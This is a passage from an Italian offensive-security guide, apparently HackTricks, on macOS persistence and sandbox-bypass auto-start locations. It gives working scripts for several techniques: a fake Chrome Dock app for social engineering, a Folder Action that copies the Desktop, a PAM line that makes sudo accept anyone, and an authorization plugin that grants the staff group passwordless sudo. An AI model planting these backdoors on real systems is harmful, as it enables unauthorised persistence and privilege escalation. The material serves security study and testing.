Il nome del file contiene la coda, il numero del lavoro e l'orario programmato per l'esecuzione. Ad esempio, diamo un'occhiata a `a0001a019bdcd2`.

- `a` - questa è la coda
- `0001a` - numero del lavoro in esadecimale, `0x1a = 26`
- `019bdcd2` - tempo in esadecimale. Rappresenta i minuti trascorsi dall'epoca. `0x019bdcd2` è `26991826` in decimale. Se lo moltiplichiamo per 60 otteniamo `1619509560`, che è `GMT: 27 aprile 2021, martedì 7:46:00`.

Se stampiamo il file del lavoro, scopriamo che contiene le stesse informazioni ottenute utilizzando `at -c`.

### Azioni della Cartella

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma è necessario poter chiamare `osascript` con argomenti per contattare **`System Events`** per poter configurare le Azioni della Cartella
- Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Ha alcune autorizzazioni TCC di base come Desktop, Documenti e Download

#### Posizione

- **`/Library/Scripts/Folder Action Scripts`**
- Richiesta di root
- **Attivazione**: Accesso alla cartella specificata
- **`~/Library/Scripts/Folder Action Scripts`**
- **Attivazione**: Accesso alla cartella specificata

#### Descrizione & Sfruttamento

Le Azioni della Cartella sono script attivati automaticamente da modifiche in una cartella, come l'aggiunta o la rimozione di elementi, o altre azioni come l'apertura o il ridimensionamento della finestra della cartella. Queste azioni possono essere utilizzate per vari compiti e possono essere attivate in modi diversi, come utilizzando l'interfaccia Finder o comandi del terminale.

Per impostare le Azioni della Cartella, hai opzioni come:

1. Creare un flusso di lavoro per le Azioni della Cartella con [Automator](https://support.apple.com/guide/automator/welcome/mac) e installarlo come servizio.
2. Allegare uno script manualmente tramite la Configurazione delle Azioni della Cartella nel menu contestuale di una cartella.
3. Utilizzare OSAScript per inviare messaggi Apple Event a `System Events.app` per impostare programmaticamente un'Azioni della Cartella.
- Questo metodo è particolarmente utile per incorporare l'azione nel sistema, offrendo un livello di persistenza.

Il seguente script è un esempio di ciò che può essere eseguito da un'Azioni della Cartella:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Per rendere lo script sopra utilizzabile da Folder Actions, compilarlo utilizzando:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Dopo che lo script è stato compilato, imposta le Azioni della Cartella eseguendo lo script qui sotto. Questo script abiliterà le Azioni della Cartella globalmente e collegherà specificamente lo script precedentemente compilato alla cartella Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Esegui lo script di configurazione con:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Questo è il modo per implementare questa persistenza tramite GUI:

Questo è lo script che verrà eseguito:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compila con: `osacompile -l JavaScript -o folder.scpt source.js`

Spostalo in:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Poi, apri l'app `Folder Actions Setup`, seleziona la **cartella che desideri monitorare** e seleziona nel tuo caso **`folder.scpt`** (nel mio caso l'ho chiamata output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Ora, se apri quella cartella con **Finder**, il tuo script verrà eseguito.

Questa configurazione è stata memorizzata nel **plist** situato in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in formato base64.

Ora, proviamo a preparare questa persistenza senza accesso GUI:

1. **Copia `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in `/tmp` per eseguire il backup:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Rimuovi** le Folder Actions che hai appena impostato:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Ora che abbiamo un ambiente vuoto

3. Copia il file di backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Apri l'app Folder Actions Setup.app per consumare questa configurazione: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> E questo non ha funzionato per me, ma queste sono le istruzioni del writeup:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma devi avere installato un'applicazione malevola all'interno del sistema
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Quando l'utente clicca sull'app all'interno del dock

#### Description & Exploitation

Tutte le applicazioni che appaiono nel Dock sono specificate all'interno del plist: **`~/Library/Preferences/com.apple.dock.plist`**

È possibile **aggiungere un'applicazione** semplicemente con:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Utilizzando un po' di **social engineering** potresti **fingere, ad esempio, Google Chrome** all'interno del dock ed eseguire effettivamente il tuo script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Deve avvenire un'azione molto specifica
- Finirai in un altro sandbox
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Richiesta root
- Trigger: Usa il selettore di colori
- `~/Library/ColorPickers`
- Trigger: Usa il selettore di colori

#### Description & Exploit

**Compila un selettore di colori** bundle con il tuo codice (puoi usare [**questo ad esempio**](https://github.com/viktorstrate/color-picker-plus)) e aggiungi un costruttore (come nella [sezione Screen Saver](macos-auto-start-locations.md#screen-saver)) e copia il bundle in `~/Library/ColorPickers`.

Poi, quando il selettore di colori viene attivato, il tuo codice dovrebbe essere eseguito.

Nota che il binario che carica la tua libreria ha un **sandbox molto restrittivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Utile per bypassare il sandbox: **No, perché è necessario eseguire la propria app**
- Bypass TCC: ???

#### Location

- Un'app specifica

#### Description & Exploit

Un esempio di applicazione con un'estensione Finder Sync [**può essere trovato qui**](https://github.com/D00MFist/InSync).

Le applicazioni possono avere `Finder Sync Extensions`. Questa estensione andrà all'interno di un'applicazione che verrà eseguita. Inoltre, affinché l'estensione possa eseguire il proprio codice, **deve essere firmata** con un valido certificato di sviluppatore Apple, deve essere **sandboxed** (anche se potrebbero essere aggiunte eccezioni rilassate) e deve essere registrata con qualcosa come:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma finirai in un sandbox di applicazione comune
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/System/Library/Screen Savers`
- Richiesta di root
- **Trigger**: Seleziona il salvaschermo
- `/Library/Screen Savers`
- Richiesta di root
- **Trigger**: Seleziona il salvaschermo
- `~/Library/Screen Savers`
- **Trigger**: Seleziona il salvaschermo

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Crea un nuovo progetto in Xcode e seleziona il template per generare un nuovo **Screen Saver**. Poi, aggiungi il tuo codice, ad esempio il seguente codice per generare log.

**Build** it, and copy the `.saver` bundle to **`~/Library/Screen Savers`**. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Nota che all'interno dei diritti del binario che carica questo codice (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) puoi trovare **`com.apple.security.app-sandbox`** sarai **all'interno del comune sandbox delle applicazioni**.

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma finirai in un'app sandbox
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
- Il sandbox sembra molto limitato

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin spotlight.
- `/Library/Spotlight/`
- **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin spotlight.
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin spotlight.
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin spotlight.
- Nuova app richiesta

#### Description & Exploitation

Spotlight è la funzione di ricerca integrata di macOS, progettata per fornire agli utenti **accesso rapido e completo ai dati sui loro computer**.\
Per facilitare questa capacità di ricerca rapida, Spotlight mantiene un **database proprietario** e crea un indice **analizzando la maggior parte dei file**, consentendo ricerche rapide sia attraverso i nomi dei file che il loro contenuto.

Il meccanismo sottostante di Spotlight coinvolge un processo centrale chiamato 'mds', che sta per **'metadata server'.** Questo processo orchestra l'intero servizio Spotlight. A complemento di questo, ci sono più demoni 'mdworker' che eseguono una varietà di compiti di manutenzione, come indicizzare diversi tipi di file (`ps -ef | grep mdworker`). Questi compiti sono resi possibili attraverso i plugin importatori di Spotlight, o **".mdimporter bundles**", che consentono a Spotlight di comprendere e indicizzare contenuti attraverso una vasta gamma di formati di file.

I plugin o **`.mdimporter`** bundles si trovano nei luoghi menzionati in precedenza e se appare un nuovo bundle viene caricato in un minuto (non è necessario riavviare alcun servizio). Questi bundle devono indicare quali **tipi di file e estensioni possono gestire**, in questo modo, Spotlight li utilizzerà quando viene creato un nuovo file con l'estensione indicata.

È possibile **trovare tutti gli `mdimporters`** caricati eseguendo:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
E per esempio **/Library/Spotlight/iBooksAuthor.mdimporter** è utilizzato per analizzare questi tipi di file (estensioni `.iba` e `.book` tra gli altri):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Se controlli il Plist di altri `mdimporter`, potresti non trovare l'entry **`UTTypeConformsTo`**. Questo perché si tratta di un _Uniform Type Identifiers_ incorporato ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) e non è necessario specificare le estensioni.
>
> Inoltre, i plugin di sistema predefiniti hanno sempre la precedenza, quindi un attaccante può accedere solo ai file che non sono altrimenti indicizzati dai `mdimporters` di Apple.

Per creare il tuo importatore, puoi iniziare con questo progetto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) e poi cambiare il nome, il **`CFBundleDocumentTypes`** e aggiungere **`UTImportedTypeDeclarations`** in modo che supporti l'estensione che desideri supportare e rifletterli in **`schema.xml`**.\
Poi **cambia** il codice della funzione **`GetMetadataForFile`** per eseguire il tuo payload quando viene creato un file con l'estensione elaborata.

Infine **compila e copia il tuo nuovo `.mdimporter`** in una delle tre posizioni precedenti e puoi controllare se viene caricato **monitorando i log** o controllando **`mdimport -L.`**

### ~~Pannello di Preferenze~~

> [!CAUTION]
> Non sembra che questo funzioni più.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Richiede un'azione specifica dell'utente
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Descrizione

Non sembra che questo funzioni più.

## Bypass del Sandbox di Root

> [!TIP]
> Qui puoi trovare posizioni di avvio utili per il **bypass del sandbox** che ti consente di eseguire semplicemente qualcosa **scrivendolo in un file** essendo **root** e/o richiedendo altre **condizioni strane.**

### Periodico

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma devi essere root
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Richiesta di root
- **Attivazione**: Quando arriva il momento
- `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`
- Richiesta di root
- **Attivazione**: Quando arriva il momento

#### Descrizione & Sfruttamento

Gli script periodici (**`/etc/periodic`**) vengono eseguiti a causa dei **lanciatori di demoni** configurati in `/System/Library/LaunchDaemons/com.apple.periodic*`. Nota che gli script memorizzati in `/etc/periodic/` vengono **eseguiti** come **proprietario del file**, quindi questo non funzionerà per un potenziale aumento di privilegi.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Ci sono altri script periodici che verranno eseguiti indicati in **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Se riesci a scrivere uno dei file `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`, verrà **eseguito prima o poi**.

> [!WARNING]
> Nota che lo script periodico verrà **eseguito come proprietario dello script**. Quindi, se un utente normale possiede lo script, verrà eseguito come quell'utente (questo potrebbe prevenire attacchi di escalation dei privilegi).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma devi essere root
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Root sempre richiesto

#### Description & Exploitation

Poiché PAM è più focalizzato su **persistenza** e malware che su una facile esecuzione all'interno di macOS, questo blog non fornirà una spiegazione dettagliata, **leggi i writeup per comprendere meglio questa tecnica**.

Controlla i moduli PAM con:
```bash
ls -l /etc/pam.d
```
Una tecnica di persistenza/escallation dei privilegi che sfrutta PAM è semplice come modificare il modulo /etc/pam.d/sudo aggiungendo all'inizio la riga:
```bash
auth       sufficient     pam_permit.so
```
Quindi apparirà **come** qualcosa del genere:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
E quindi qualsiasi tentativo di utilizzare **`sudo` funzionerà**.

> [!CAUTION]
> Nota che questa directory è protetta da TCC, quindi è altamente probabile che l'utente riceva un prompt che chiede l'accesso.

Un altro bel esempio è su, dove puoi vedere che è anche possibile fornire parametri ai moduli PAM (e potresti anche backdoor questo file):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma è necessario essere root e fare configurazioni extra
- Bypass TCC: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- Richiesta root
- È anche necessario configurare il database di autorizzazione per utilizzare il plugin

#### Description & Exploitation

Puoi creare un plugin di autorizzazione che verrà eseguito quando un utente accede per mantenere la persistenza. Per ulteriori informazioni su come crearne uno di questi plugin, controlla i writeup precedenti (e fai attenzione, uno scritto male può bloccarti e dovrai pulire il tuo mac dalla modalità di recupero).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Sposta** il pacchetto nella posizione da caricare:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Infine, aggiungi la **regola** per caricare questo Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Il **`evaluate-mechanisms`** informerà il framework di autorizzazione che sarà necessario **chiamare un meccanismo esterno per l'autorizzazione**. Inoltre, **`privileged`** farà sì che venga eseguito da root.

Attivalo con:
```bash
security authorize com.asdf.asdf
```
E poi il **gruppo staff dovrebbe avere accesso sudo** (leggi `/etc/sudoers` per confermare).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma devi essere root e l'utente deve usare man
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/private/etc/man.conf`**
- Richiesta root
- **`/private/etc/man.conf`**: Ogni volta che viene usato man

#### Descrizione & Exploit

Il file di configurazione **`/private/etc/man.conf`** indica il binario/script da utilizzare quando si aprono i file di documentazione man. Quindi il percorso dell'eseguibile potrebbe essere modificato in modo che ogni volta che l'utente usa man per leggere della documentazione venga eseguita una backdoor.

Ad esempio impostato in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
E poi crea `/tmp/view` come:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma è necessario essere root e apache deve essere in esecuzione
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
- Httpd non ha diritti

#### Location

- **`/etc/apache2/httpd.conf`**
- Richiesta root
- Attivazione: Quando Apache2 viene avviato

#### Description & Exploit

Puoi indicare in `/etc/apache2/httpd.conf` di caricare un modulo aggiungendo una riga come:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
In questo modo, il tuo modulo compilato verrà caricato da Apache. L'unica cosa è che devi **firmarlo con un certificato Apple valido**, oppure devi **aggiungere un nuovo certificato di fiducia** nel sistema e **firmarlo** con esso.

Poi, se necessario, per assicurarti che il server venga avviato, puoi eseguire:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Esempio di codice per il Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Utile per bypassare il sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma è necessario essere root, auditd deve essere in esecuzione e causare un avviso
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
- Richiesta root
- **Trigger**: Quando auditd rileva un avviso

#### Description & Exploit

Ogni volta che auditd rileva un avviso, lo script **`/etc/security/audit_warn`** viene **eseguito**. Quindi potresti aggiungere il tuo payload su di esso.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Potresti forzare un avviso con `sudo audit -n`.

### Elementi di Avvio

> [!CAUTION] > **Questo è deprecato, quindi non dovrebbe essere trovato nulla in quelle directory.**

L'**StartupItem** è una directory che dovrebbe essere posizionata all'interno di `/Library/StartupItems/` o `/System/Library/StartupItems/`. Una volta che questa directory è stabilita, deve contenere due file specifici:

1. Un **rc script**: uno script shell eseguito all'avvio.
2. Un **file plist**, specificamente chiamato `StartupParameters.plist`, che contiene varie impostazioni di configurazione.

Assicurati che sia l'rc script che il file `StartupParameters.plist` siano correttamente posizionati all'interno della directory **StartupItem** affinché il processo di avvio possa riconoscerli e utilizzarli.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Non riesco a trovare questo componente nel mio macOS, quindi per ulteriori informazioni controlla il writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introdotto da Apple, **emond** è un meccanismo di registrazione che sembra essere poco sviluppato o possibilmente abbandonato, eppure rimane accessibile. Sebbene non sia particolarmente utile per un amministratore Mac, questo servizio oscuro potrebbe servire come un metodo di persistenza sottile per gli attori delle minacce, probabilmente inosservato dalla maggior parte degli amministratori macOS.

